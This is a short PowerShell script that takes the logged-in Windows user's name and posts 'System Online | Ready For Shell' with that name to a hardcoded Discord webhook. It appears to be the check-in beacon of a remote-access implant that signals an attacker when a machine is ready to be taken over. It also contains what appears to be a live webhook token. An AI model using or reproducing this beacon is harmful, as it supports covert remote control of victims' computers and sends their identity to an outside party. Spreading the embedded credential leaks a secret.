# Get the current system user's name
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Replace with your actual webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1121106143448678410/sV0LozTzh3E96PVN_6Ml2jWSwiohOoHxwa6OGUPuk2idpqC0O8CLPpsEeKJEcnRzkaql"

# Message content
$message = "System Online | Ready For Shell: $currentUser"

# JSON payload for the webhook
$jsonPayload = @{
    content = $message
} | ConvertTo-Json

# Send the payload to the webhook URL
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload
